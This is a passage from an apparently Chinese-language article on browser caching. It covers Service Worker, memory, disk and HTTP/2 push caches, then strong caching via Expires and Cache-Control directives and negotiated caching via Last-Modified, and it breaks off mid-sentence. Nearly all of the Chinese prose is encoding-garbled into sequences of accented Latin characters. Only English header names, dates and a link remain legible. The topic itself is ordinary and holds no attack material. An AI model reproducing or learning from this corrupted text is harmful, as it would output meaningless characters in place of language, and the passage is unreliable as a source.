Workerçš„è¯ï¼Œä¼ è¾“åè®®å¿…é¡»ä¸º HTTPSã€‚å› ä¸º Service Worker ä¸­æ¶‰åŠåˆ°è¯·æ±‚æ‹¦æˆªï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨ HTTPS åè®®æ¥ä¿éšœå®‰å…¨ã€‚Service Worker çš„ç¼“å­˜ä¸Žæµè§ˆå™¨å…¶ä»–å†…å»ºçš„ç¼“å­˜æœºåˆ¶ä¸åŒï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬è‡ªç”±æŽ§åˆ¶ç¼“å­˜å“ªäº›æ–‡ä»¶ã€å¦‚ä½•åŒ¹é…ç¼“å­˜ã€å¦‚ä½•è¯»å–ç¼“å­˜ï¼Œå¹¶ä¸”ç¼“å­˜æ˜¯æŒç»­æ€§çš„ã€‚ Service Worker å®žçŽ°ç¼“å­˜åŠŸèƒ½ä¸€èˆ¬åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼šé¦–å…ˆéœ€è¦å…ˆæ³¨å†Œ Service Workerï¼Œç„¶åŽç›‘å¬åˆ° install äº‹ä»¶ä»¥åŽå°±å¯ä»¥ç¼“å­˜éœ€è¦çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨ä¸‹æ¬¡ç”¨æˆ·è®¿é—®çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡æ‹¦æˆªè¯·æ±‚çš„æ–¹å¼æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ç¼“å­˜ï¼Œå­˜åœ¨ç¼“å­˜çš„è¯å°±å¯ä»¥ç›´æŽ¥è¯»å–ç¼“å­˜æ–‡ä»¶ï¼Œå¦åˆ™å°±åŽ»è¯·æ±‚æ•°æ®ã€‚ å½“ Service Worker æ²¡æœ‰å‘½ä¸­ç¼“å­˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åŽ»è°ƒç”¨ fetch å‡½æ•°èŽ·å–æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœæˆ‘ä»¬æ²¡æœ‰åœ¨ Service Worker å‘½ä¸­ç¼“å­˜çš„è¯ï¼Œä¼šæ ¹æ®ç¼“å­˜æŸ¥æ‰¾ä¼˜å…ˆçº§åŽ»æŸ¥æ‰¾æ•°æ®ã€‚ä½†æ˜¯ä¸ç®¡æˆ‘ä»¬æ˜¯ä»Ž Memory Cache ä¸­è¿˜æ˜¯ä»Žç½‘ç»œè¯·æ±‚ä¸­èŽ·å–çš„æ•°æ®ï¼Œæµè§ˆå™¨éƒ½ä¼šæ˜¾ç¤ºæˆ‘ä»¬æ˜¯ä»Ž Service Worker ä¸­èŽ·å–çš„å†…å®¹ã€‚ 2. Memory CacheMemory Cache ä¹Ÿå°±æ˜¯å†…å­˜ä¸­çš„ç¼“å­˜ï¼Œä¸»è¦åŒ…å«çš„æ˜¯å½“å‰ä¸­é¡µé¢ä¸­å·²ç»æŠ“å–åˆ°çš„èµ„æº,ä¾‹å¦‚é¡µé¢ä¸Šå·²ç»ä¸‹è½½çš„æ ·å¼ã€è„šæœ¬ã€å›¾ç‰‡ç­‰ã€‚è¯»å–å†…å­˜ä¸­çš„æ•°æ®è‚¯å®šæ¯”ç£ç›˜å¿«,å†…å­˜ç¼“å­˜è™½ç„¶è¯»å–é«˜æ•ˆï¼Œå¯æ˜¯ç¼“å­˜æŒç»­æ€§å¾ˆçŸ­ï¼Œä¼šéšç€è¿›ç¨‹çš„é‡Šæ”¾è€Œé‡Šæ”¾ã€‚ ä¸€æ—¦æˆ‘ä»¬å…³é—­ Tab é¡µé¢ï¼Œå†…å­˜ä¸­çš„ç¼“å­˜ä¹Ÿå°±è¢«é‡Šæ”¾äº†ã€‚ é‚£ä¹ˆæ—¢ç„¶å†…å­˜ç¼“å­˜è¿™ä¹ˆé«˜æ•ˆï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½è®©æ•°æ®éƒ½å­˜æ”¾åœ¨å†…å­˜ä¸­å‘¢ï¼Ÿè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚è®¡ç®—æœºä¸­çš„å†…å­˜ä¸€å®šæ¯”ç¡¬ç›˜å®¹é‡å°å¾—å¤šï¼Œæ“ä½œç³»ç»Ÿéœ€è¦ç²¾æ‰“ç»†ç®—å†…å­˜çš„ä½¿ç”¨ï¼Œæ‰€ä»¥èƒ½è®©æˆ‘ä»¬ä½¿ç”¨çš„å†…å­˜å¿…ç„¶ä¸å¤šã€‚ å½“æˆ‘ä»¬è®¿é—®è¿‡é¡µé¢ä»¥åŽï¼Œå†æ¬¡åˆ·æ–°é¡µé¢ï¼Œå¯ä»¥å‘çŽ°å¾ˆå¤šæ•°æ®éƒ½æ¥è‡ªäºŽå†…å­˜ç¼“å­˜ å†…å­˜ç¼“å­˜ä¸­æœ‰ä¸€å—é‡è¦çš„ç¼“å­˜èµ„æºæ˜¯preloaderç›¸å…³æŒ‡ä»¤ï¼ˆä¾‹å¦‚&lt;link rel=&quot;prefetch&quot;&gt;ï¼‰ä¸‹è½½çš„èµ„æºã€‚æ€»æ‰€å‘¨çŸ¥preloaderçš„ç›¸å…³æŒ‡ä»¤å·²ç»æ˜¯é¡µé¢ä¼˜åŒ–çš„å¸¸è§æ‰‹æ®µä¹‹ä¸€ï¼Œå®ƒå¯ä»¥ä¸€è¾¹è§£æžjs/cssæ–‡ä»¶ï¼Œä¸€è¾¹ç½‘ç»œè¯·æ±‚ä¸‹ä¸€ä¸ªèµ„æºã€‚ éœ€è¦æ³¨æ„çš„äº‹æƒ…æ˜¯ï¼Œå†…å­˜ç¼“å­˜åœ¨ç¼“å­˜èµ„æºæ—¶å¹¶ä¸å…³å¿ƒè¿”å›žèµ„æºçš„HTTPç¼“å­˜å¤´Cache-Controlæ˜¯ä»€ä¹ˆå€¼ï¼ŒåŒæ—¶èµ„æºçš„åŒ¹é…ä¹Ÿå¹¶éžä»…ä»…æ˜¯å¯¹URLåšåŒ¹é…ï¼Œè¿˜å¯èƒ½ä¼šå¯¹Content-Typeï¼ŒCORSç­‰å…¶ä»–ç‰¹å¾åšæ ¡éªŒã€‚ 3. Disk CacheDisk Cache ä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ä¸­çš„ç¼“å­˜ï¼Œè¯»å–é€Ÿåº¦æ…¢ç‚¹ï¼Œä½†æ˜¯ä»€ä¹ˆéƒ½èƒ½å­˜å‚¨åˆ°ç£ç›˜ä¸­ï¼Œæ¯”ä¹‹ Memory Cache èƒœåœ¨å®¹é‡å’Œå­˜å‚¨æ—¶æ•ˆæ€§ä¸Šã€‚ åœ¨æ‰€æœ‰æµè§ˆå™¨ç¼“å­˜ä¸­ï¼ŒDisk Cache è¦†ç›–é¢åŸºæœ¬æ˜¯æœ€å¤§çš„ã€‚å®ƒä¼šæ ¹æ® HTTP Herder ä¸­çš„å­—æ®µåˆ¤æ–­å“ªäº›èµ„æºéœ€è¦ç¼“å­˜ï¼Œå“ªäº›èµ„æºå¯ä»¥ä¸è¯·æ±‚ç›´æŽ¥ä½¿ç”¨ï¼Œå“ªäº›èµ„æºå·²ç»è¿‡æœŸéœ€è¦é‡æ–°è¯·æ±‚ã€‚å¹¶ä¸”å³ä½¿åœ¨è·¨ç«™ç‚¹çš„æƒ…å†µä¸‹ï¼Œç›¸åŒåœ°å€çš„èµ„æºä¸€æ—¦è¢«ç¡¬ç›˜ç¼“å­˜ä¸‹æ¥ï¼Œå°±ä¸ä¼šå†æ¬¡åŽ»è¯·æ±‚æ•°æ®ã€‚ç»å¤§éƒ¨åˆ†çš„ç¼“å­˜éƒ½æ¥è‡ª Disk Cacheï¼Œå…³äºŽ HTTP çš„åè®®å¤´ä¸­çš„ç¼“å­˜å­—æ®µï¼Œæˆ‘ä»¬ä¼šåœ¨ä¸‹æ–‡è¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚ æµè§ˆå™¨ä¼šæŠŠå“ªäº›æ–‡ä»¶ä¸¢è¿›å†…å­˜ä¸­ï¼Ÿå“ªäº›ä¸¢è¿›ç¡¬ç›˜ä¸­ï¼Ÿ å…³äºŽè¿™ç‚¹ï¼Œç½‘ä¸Šè¯´æ³•ä¸ä¸€ï¼Œä¸è¿‡ä»¥ä¸‹è§‚ç‚¹æ¯”è¾ƒé å¾—ä½ï¼š å¯¹äºŽå¤§æ–‡ä»¶æ¥è¯´ï¼Œå¤§æ¦‚çŽ‡æ˜¯ä¸å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œåä¹‹ä¼˜å…ˆ å½“å‰ç³»ç»Ÿå†…å­˜ä½¿ç”¨çŽ‡é«˜çš„è¯ï¼Œæ–‡ä»¶ä¼˜å…ˆå­˜å‚¨è¿›ç¡¬ç›˜ 4. Push CachePush Cacheï¼ˆæŽ¨é€ç¼“å­˜ï¼‰æ˜¯ HTTP/2 ä¸­çš„å†…å®¹ï¼Œå½“ä»¥ä¸Šä¸‰ç§ç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­æ—¶ï¼Œå®ƒæ‰ä¼šè¢«ä½¿ç”¨ã€‚å®ƒåªåœ¨ä¼šè¯ï¼ˆSessionï¼‰ä¸­å­˜åœ¨ï¼Œä¸€æ—¦ä¼šè¯ç»“æŸå°±è¢«é‡Šæ”¾ï¼Œå¹¶ä¸”ç¼“å­˜æ—¶é—´ä¹Ÿå¾ˆçŸ­æš‚ï¼Œåœ¨Chromeæµè§ˆå™¨ä¸­åªæœ‰5åˆ†é’Ÿå·¦å³ï¼ŒåŒæ—¶å®ƒä¹Ÿå¹¶éžä¸¥æ ¼æ‰§è¡ŒHTTPå¤´ä¸­çš„ç¼“å­˜æŒ‡ä»¤ã€‚ Push Cache åœ¨å›½å†…èƒ½å¤ŸæŸ¥åˆ°çš„èµ„æ–™å¾ˆå°‘ï¼Œä¹Ÿæ˜¯å› ä¸º HTTP/2 åœ¨å›½å†…ä¸å¤Ÿæ™®åŠã€‚è¿™é‡ŒæŽ¨èé˜…è¯»Jake Archibaldçš„ HTTP/2 push is tougher than I thought è¿™ç¯‡æ–‡ç« ï¼Œæ–‡ç« ä¸­çš„å‡ ä¸ªç»“è®ºï¼š æ‰€æœ‰çš„èµ„æºéƒ½èƒ½è¢«æŽ¨é€ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«ç¼“å­˜,ä½†æ˜¯ Edge å’Œ Safari æµè§ˆå™¨æ”¯æŒç›¸å¯¹æ¯”è¾ƒå·® å¯ä»¥æŽ¨é€ no-cache å’Œ no-store çš„èµ„æº ä¸€æ—¦è¿žæŽ¥è¢«å…³é—­ï¼ŒPush Cache å°±è¢«é‡Šæ”¾ å¤šä¸ªé¡µé¢å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªHTTP/2çš„è¿žæŽ¥ï¼Œä¹Ÿå°±å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªPush Cacheã€‚è¿™ä¸»è¦è¿˜æ˜¯ä¾èµ–æµè§ˆå™¨çš„å®žçŽ°è€Œå®šï¼Œå‡ºäºŽå¯¹æ€§èƒ½çš„è€ƒè™‘ï¼Œæœ‰çš„æµè§ˆå™¨ä¼šå¯¹ç›¸åŒåŸŸåä½†ä¸åŒçš„tabæ ‡ç­¾ä½¿ç”¨åŒä¸€ä¸ªHTTPè¿žæŽ¥ã€‚ Push Cache ä¸­çš„ç¼“å­˜åªèƒ½è¢«ä½¿ç”¨ä¸€æ¬¡ æµè§ˆå™¨å¯ä»¥æ‹’ç»æŽ¥å—å·²ç»å­˜åœ¨çš„èµ„æºæŽ¨é€ ä½ å¯ä»¥ç»™å…¶ä»–åŸŸåæŽ¨é€èµ„æº å¦‚æžœä»¥ä¸Šå››ç§ç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­çš„è¯ï¼Œé‚£ä¹ˆåªèƒ½å‘èµ·è¯·æ±‚æ¥èŽ·å–èµ„æºäº†ã€‚ é‚£ä¹ˆä¸ºäº†æ€§èƒ½ä¸Šçš„è€ƒè™‘ï¼Œå¤§éƒ¨åˆ†çš„æŽ¥å£éƒ½åº”è¯¥é€‰æ‹©å¥½ç¼“å­˜ç­–ç•¥ï¼Œé€šå¸¸æµè§ˆå™¨ç¼“å­˜ç­–ç•¥åˆ†ä¸ºä¸¤ç§ï¼šå¼ºç¼“å­˜å’Œåå•†ç¼“å­˜ï¼Œå¹¶ä¸”ç¼“å­˜ç­–ç•¥éƒ½æ˜¯é€šè¿‡è®¾ç½® HTTP Header æ¥å®žçŽ°çš„ã€‚ ç¼“å­˜è¿‡ç¨‹åˆ†æžæµè§ˆå™¨ä¸ŽæœåŠ¡å™¨é€šä¿¡çš„æ–¹å¼ä¸ºåº”ç­”æ¨¡å¼ï¼Œå³æ˜¯ï¼šæµè§ˆå™¨å‘èµ·HTTPè¯·æ±‚ â€“ æœåŠ¡å™¨å“åº”è¯¥è¯·æ±‚ï¼Œé‚£ä¹ˆæµè§ˆå™¨æ€Žä¹ˆç¡®å®šä¸€ä¸ªèµ„æºè¯¥ä¸è¯¥ç¼“å­˜ï¼Œå¦‚ä½•åŽ»ç¼“å­˜å‘¢ï¼Ÿæµè§ˆå™¨ç¬¬ä¸€æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯¥è¯·æ±‚åŽæ‹¿åˆ°è¯·æ±‚ç»“æžœåŽï¼Œå°†è¯·æ±‚ç»“æžœå’Œç¼“å­˜æ ‡è¯†å­˜å…¥æµè§ˆå™¨ç¼“å­˜ï¼Œæµè§ˆå™¨å¯¹äºŽç¼“å­˜çš„å¤„ç†æ˜¯æ ¹æ®ç¬¬ä¸€æ¬¡è¯·æ±‚èµ„æºæ—¶è¿”å›žçš„å“åº”å¤´æ¥ç¡®å®šçš„ã€‚å…·ä½“è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š ç”±ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š æµè§ˆå™¨æ¯æ¬¡å‘èµ·è¯·æ±‚ï¼Œéƒ½ä¼šå…ˆåœ¨æµè§ˆå™¨ç¼“å­˜ä¸­æŸ¥æ‰¾è¯¥è¯·æ±‚çš„ç»“æžœä»¥åŠç¼“å­˜æ ‡è¯† æµè§ˆå™¨æ¯æ¬¡æ‹¿åˆ°è¿”å›žçš„è¯·æ±‚ç»“æžœéƒ½ä¼šå°†è¯¥ç»“æžœå’Œç¼“å­˜æ ‡è¯†å­˜å…¥æµè§ˆå™¨ç¼“å­˜ä¸­ ä»¥ä¸Šä¸¤ç‚¹ç»“è®ºå°±æ˜¯æµè§ˆå™¨ç¼“å­˜æœºåˆ¶çš„å…³é”®ï¼Œå®ƒç¡®ä¿äº†æ¯ä¸ªè¯·æ±‚çš„ç¼“å­˜å­˜å…¥ä¸Žè¯»å–ï¼Œåªè¦æˆ‘ä»¬å†ç†è§£æµè§ˆå™¨ç¼“å­˜çš„ä½¿ç”¨è§„åˆ™ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„é—®é¢˜å°±è¿Žåˆƒè€Œè§£äº†ï¼Œæœ¬æ–‡ä¹Ÿå°†å›´ç»•ç€è¿™ç‚¹è¿›è¡Œè¯¦ç»†åˆ†æžã€‚ä¸ºäº†æ–¹ä¾¿å¤§å®¶ç†è§£ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹æ®æ˜¯å¦éœ€è¦å‘æœåŠ¡å™¨é‡æ–°å‘èµ·HTTPè¯·æ±‚å°†ç¼“å­˜è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜ã€‚ https://www.cnblogs.com/lyzg/p/5125934.html#_label2 å¼ºç¼“å­˜å¼ºç¼“å­˜ï¼šä¸ä¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç›´æŽ¥ä»Žç¼“å­˜ä¸­è¯»å–èµ„æºï¼Œåœ¨chromeæŽ§åˆ¶å°çš„Networké€‰é¡¹ä¸­å¯ä»¥çœ‹åˆ°è¯¥è¯·æ±‚è¿”å›ž200çš„çŠ¶æ€ç ï¼Œå¹¶ä¸”Sizeæ˜¾ç¤ºfrom disk cacheæˆ–from memory cacheã€‚å¼ºç¼“å­˜å¯ä»¥é€šè¿‡è®¾ç½®ä¸¤ç§ HTTP Header å®žçŽ°ï¼šExpires å’Œ Cache-Controlã€‚ 1. Expiresç¼“å­˜è¿‡æœŸæ—¶é—´ï¼Œç”¨æ¥æŒ‡å®šèµ„æºåˆ°æœŸçš„æ—¶é—´ï¼Œæ˜¯æœåŠ¡å™¨ç«¯çš„å…·ä½“çš„æ—¶é—´ç‚¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒExpires=max-age + è¯·æ±‚æ—¶é—´ï¼Œéœ€è¦å’ŒLast-modifiedç»“åˆä½¿ç”¨ã€‚Expiresæ˜¯WebæœåŠ¡å™¨å“åº”æ¶ˆæ¯å¤´å­—æ®µï¼Œåœ¨å“åº”httpè¯·æ±‚æ—¶å‘Šè¯‰æµè§ˆå™¨åœ¨è¿‡æœŸæ—¶é—´å‰æµè§ˆå™¨å¯ä»¥ç›´æŽ¥ä»Žæµè§ˆå™¨ç¼“å­˜å–æ•°æ®ï¼Œè€Œæ— éœ€å†æ¬¡è¯·æ±‚ã€‚ Expires æ˜¯ HTTP/1 çš„äº§ç‰©ï¼Œå—é™äºŽæœ¬åœ°æ—¶é—´ï¼Œå¦‚æžœä¿®æ”¹äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½ä¼šé€ æˆç¼“å­˜å¤±æ•ˆã€‚Expires: Wed, 22 Oct 2018 08:41:00 GMTè¡¨ç¤ºèµ„æºä¼šåœ¨ Wed, 22 Oct 2018 08:41:00 GMT åŽè¿‡æœŸï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ã€‚ 2.Cache-Controlåœ¨HTTP/1.1ä¸­ï¼ŒCache-Controlæ˜¯æœ€é‡è¦çš„è§„åˆ™ï¼Œä¸»è¦ç”¨äºŽæŽ§åˆ¶ç½‘é¡µç¼“å­˜ã€‚æ¯”å¦‚å½“Cache-Control:max-age=300æ—¶ï¼Œåˆ™ä»£è¡¨åœ¨è¿™ä¸ªè¯·æ±‚æ­£ç¡®è¿”å›žæ—¶é—´ï¼ˆæµè§ˆå™¨ä¹Ÿä¼šè®°å½•ä¸‹æ¥ï¼‰çš„5åˆ†é’Ÿå†…å†æ¬¡åŠ è½½èµ„æºï¼Œå°±ä¼šå‘½ä¸­å¼ºç¼“å­˜ã€‚ Cache-Control å¯ä»¥åœ¨è¯·æ±‚å¤´æˆ–è€…å“åº”å¤´ä¸­è®¾ç½®ï¼Œå¹¶ä¸”å¯ä»¥ç»„åˆä½¿ç”¨å¤šç§æŒ‡ä»¤ï¼š publicï¼šæ‰€æœ‰å†…å®¹éƒ½å°†è¢«ç¼“å­˜ï¼ˆå®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨éƒ½å¯ç¼“å­˜ï¼‰ã€‚å…·ä½“æ¥è¯´å“åº”å¯è¢«ä»»ä½•ä¸­é—´èŠ‚ç‚¹ç¼“å­˜ï¼Œå¦‚ Browser &lt;â€“ proxy1 &lt;â€“ proxy2 &lt;â€“ Serverï¼Œä¸­é—´çš„proxyå¯ä»¥ç¼“å­˜èµ„æºï¼Œæ¯”å¦‚ä¸‹æ¬¡å†è¯·æ±‚åŒä¸€èµ„æºproxy1ç›´æŽ¥æŠŠè‡ªå·±ç¼“å­˜çš„ä¸œè¥¿ç»™ Browser è€Œä¸å†å‘proxy2è¦ã€‚ privateï¼šæ‰€æœ‰å†…å®¹åªæœ‰å®¢æˆ·ç«¯å¯ä»¥ç¼“å­˜ï¼ŒCache-Controlçš„é»˜è®¤å–å€¼ã€‚å…·ä½“æ¥è¯´ï¼Œè¡¨ç¤ºä¸­é—´èŠ‚ç‚¹ä¸å…è®¸ç¼“å­˜ï¼Œå¯¹äºŽBrowser &lt;â€“ proxy1 &lt;â€“ proxy2 &lt;â€“ Serverï¼Œproxy ä¼šè€è€å®žå®žæŠŠServer è¿”å›žçš„æ•°æ®å‘é€ç»™proxy1,è‡ªå·±ä¸ç¼“å­˜ä»»ä½•æ•°æ®ã€‚å½“ä¸‹æ¬¡Browserå†æ¬¡è¯·æ±‚æ—¶proxyä¼šåšå¥½è¯·æ±‚è½¬å‘è€Œä¸æ˜¯è‡ªä½œä¸»å¼ ç»™è‡ªå·±ç¼“å­˜çš„æ•°æ®ã€‚no-cacheï¼šå®¢æˆ·ç«¯ç¼“å­˜å†…å®¹ï¼Œæ˜¯å¦ä½¿ç”¨ç¼“å­˜åˆ™éœ€è¦ç»è¿‡åå•†ç¼“å­˜æ¥éªŒè¯å†³å®šã€‚è¡¨ç¤ºä¸ä½¿ç”¨ Cache-Controlçš„ç¼“å­˜æŽ§åˆ¶æ–¹å¼åšå‰ç½®éªŒè¯ï¼Œè€Œæ˜¯ä½¿ç”¨ Etag æˆ–è€…Last-Modifiedå­—æ®µæ¥æŽ§åˆ¶ç¼“å­˜ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œno-cacheè¿™ä¸ªåå­—æœ‰ä¸€ç‚¹è¯¯å¯¼ã€‚è®¾ç½®äº†no-cacheä¹‹åŽï¼Œå¹¶ä¸æ˜¯è¯´æµè§ˆå™¨å°±ä¸å†ç¼“å­˜æ•°æ®ï¼Œåªæ˜¯æµè§ˆå™¨åœ¨ä½¿ç”¨ç¼“å­˜æ•°æ®æ—¶ï¼Œéœ€è¦å…ˆç¡®è®¤ä¸€ä¸‹æ•°æ®æ˜¯å¦è¿˜è·ŸæœåŠ¡å™¨ä¿æŒä¸€è‡´ã€‚ no-storeï¼šæ‰€æœ‰å†…å®¹éƒ½ä¸ä¼šè¢«ç¼“å­˜ï¼Œå³ä¸ä½¿ç”¨å¼ºåˆ¶ç¼“å­˜ï¼Œä¹Ÿä¸ä½¿ç”¨åå•†ç¼“å­˜ max-ageï¼šmax-age=xxx (xxx is numeric)è¡¨ç¤ºç¼“å­˜å†…å®¹å°†åœ¨xxxç§’åŽå¤±æ•ˆ s-maxageï¼ˆå•ä½ä¸ºs)ï¼šåŒmax-ageä½œç”¨ä¸€æ ·ï¼Œåªåœ¨ä»£ç†æœåŠ¡å™¨ä¸­ç”Ÿæ•ˆï¼ˆæ¯”å¦‚CDNç¼“å­˜ï¼‰ã€‚æ¯”å¦‚å½“s-maxage=60æ—¶ï¼Œåœ¨è¿™60ç§’ä¸­ï¼Œå³ä½¿æ›´æ–°äº†CDNçš„å†…å®¹ï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šè¿›è¡Œè¯·æ±‚ã€‚max-ageç”¨äºŽæ™®é€šç¼“å­˜ï¼Œè€Œs-maxageç”¨äºŽä»£ç†ç¼“å­˜ã€‚s-maxageçš„ä¼˜å…ˆçº§é«˜äºŽmax-ageã€‚å¦‚æžœå­˜åœ¨s-maxageï¼Œåˆ™ä¼šè¦†ç›–æŽ‰max-ageå’ŒExpires headerã€‚ max-staleï¼šèƒ½å®¹å¿çš„æœ€å¤§è¿‡æœŸæ—¶é—´ã€‚max-staleæŒ‡ä»¤æ ‡ç¤ºäº†å®¢æˆ·ç«¯æ„¿æ„æŽ¥æ”¶ä¸€ä¸ªå·²ç»è¿‡æœŸäº†çš„å“åº”ã€‚å¦‚æžœæŒ‡å®šäº†max-staleçš„å€¼ï¼Œåˆ™æœ€å¤§å®¹å¿æ—¶é—´ä¸ºå¯¹åº”çš„ç§’æ•°ã€‚å¦‚æžœæ²¡æœ‰æŒ‡å®šï¼Œé‚£ä¹ˆè¯´æ˜Žæµè§ˆå™¨æ„¿æ„æŽ¥æ”¶ä»»ä½•ageçš„å“åº”ï¼ˆageè¡¨ç¤ºå“åº”ç”±æºç«™ç”Ÿæˆæˆ–ç¡®è®¤çš„æ—¶é—´ä¸Žå½“å‰æ—¶é—´çš„å·®å€¼ï¼‰ã€‚ min-freshï¼šèƒ½å¤Ÿå®¹å¿çš„æœ€å°æ–°é²œåº¦ã€‚min-freshæ ‡ç¤ºäº†å®¢æˆ·ç«¯ä¸æ„¿æ„æŽ¥å—æ–°é²œåº¦ä¸å¤šäºŽå½“å‰çš„ageåŠ ä¸Šmin-freshè®¾å®šçš„æ—¶é—´ä¹‹å’Œçš„å“åº”ã€‚ ä»Žå›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¤šä¸ªæŒ‡ä»¤é…åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ï¼Œè¾¾åˆ°å¤šä¸ªç›®çš„ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¸Œæœ›èµ„æºèƒ½è¢«ç¼“å­˜ä¸‹æ¥ï¼Œå¹¶ä¸”æ˜¯å®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨éƒ½èƒ½ç¼“å­˜ï¼Œè¿˜èƒ½è®¾ç½®ç¼“å­˜å¤±æ•ˆæ—¶é—´ç­‰ç­‰ã€‚ 3.Expireså’ŒCache-Controlä¸¤è€…å¯¹æ¯”å…¶å®žè¿™ä¸¤è€…å·®åˆ«ä¸å¤§ï¼ŒåŒºåˆ«å°±åœ¨äºŽ Expires æ˜¯http1.0çš„äº§ç‰©ï¼ŒCache-Controlæ˜¯http1.1çš„äº§ç‰©ï¼Œä¸¤è€…åŒæ—¶å­˜åœ¨çš„è¯ï¼ŒCache-Controlä¼˜å…ˆçº§é«˜äºŽExpiresï¼›åœ¨æŸäº›ä¸æ”¯æŒHTTP1.1çš„çŽ¯å¢ƒä¸‹ï¼ŒExpireså°±ä¼šå‘æŒ¥ç”¨å¤„ã€‚æ‰€ä»¥Expireså…¶å®žæ˜¯è¿‡æ—¶çš„äº§ç‰©ï¼ŒçŽ°é˜¶æ®µå®ƒçš„å­˜åœ¨åªæ˜¯ä¸€ç§å…¼å®¹æ€§çš„å†™æ³•ã€‚å¼ºç¼“å­˜åˆ¤æ–­æ˜¯å¦ç¼“å­˜çš„ä¾æ®æ¥è‡ªäºŽæ˜¯å¦è¶…å‡ºæŸä¸ªæ—¶é—´æˆ–è€…æŸä¸ªæ—¶é—´æ®µï¼Œè€Œä¸å…³å¿ƒæœåŠ¡å™¨ç«¯æ–‡ä»¶æ˜¯å¦å·²ç»æ›´æ–°ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´åŠ è½½æ–‡ä»¶ä¸æ˜¯æœåŠ¡å™¨ç«¯æœ€æ–°çš„å†…å®¹ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•èŽ·çŸ¥æœåŠ¡å™¨ç«¯å†…å®¹æ˜¯å¦å·²ç»å‘ç”Ÿäº†æ›´æ–°å‘¢ï¼Ÿæ­¤æ—¶æˆ‘ä»¬éœ€è¦ç”¨åˆ°åå•†ç¼“å­˜ç­–ç•¥ã€‚ åå•†ç¼“å­˜åå•†ç¼“å­˜å°±æ˜¯å¼ºåˆ¶ç¼“å­˜å¤±æ•ˆåŽï¼Œæµè§ˆå™¨æºå¸¦ç¼“å­˜æ ‡è¯†å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨æ ¹æ®ç¼“å­˜æ ‡è¯†å†³å®šæ˜¯å¦ä½¿ç”¨ç¼“å­˜çš„è¿‡ç¨‹ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š åå•†ç¼“å­˜ç”Ÿæ•ˆï¼Œè¿”å›ž304å’ŒNot Modified åå•†ç¼“å­˜å¤±æ•ˆï¼Œè¿”å›ž200å’Œè¯·æ±‚ç»“æžœ åå•†ç¼“å­˜å¯ä»¥é€šè¿‡è®¾ç½®ä¸¤ç§ HTTP Header å®žçŽ°ï¼šLast-Modified å’Œ ETag ã€‚ 1.Last-Modifiedå’ŒIf-Modified-Sinceæµè§ˆå™¨åœ¨ç¬¬ä¸€æ¬¡è®¿é—®èµ„æºæ—¶ï¼ŒæœåŠ¡å™¨è¿”å›žèµ„æºçš„åŒæ—¶ï¼Œåœ¨response headerä¸­æ·»åŠ  Last-Modifiedçš„headerï¼Œå€¼æ˜¯è¿™ä¸ªèµ„æºåœ¨æœåŠ¡å™¨ä¸Šçš„æœ€åŽä¿®æ”¹æ—¶é—´ï¼Œæµè§ˆå™¨æŽ¥æ”¶åŽç¼“å­˜æ–‡ä»¶å’Œheaderï¼› 1Last-Modified: Fri, 22 Jul 2016 01:47:00 GMT æµè§ˆå™¨ä¸‹ä¸€æ¬¡è¯·æ±‚è¿™ä¸ªèµ„æºï¼Œæµè§ˆå™¨æ£€æµ‹åˆ°æœ‰ Last-Modifiedè¿™ä¸ªheaderï¼ŒäºŽæ˜¯æ·»åŠ If-Modified-Sinceè¿™ä¸ªheaderï¼Œå€¼å°±æ˜¯Last-Modifiedä¸­çš„å€¼ï¼›æœåŠ¡å™¨å†æ¬¡æ”¶åˆ°è¿™ä¸ªèµ„æºè¯·æ±‚ï¼Œä¼šæ ¹æ® If-Modified-Since 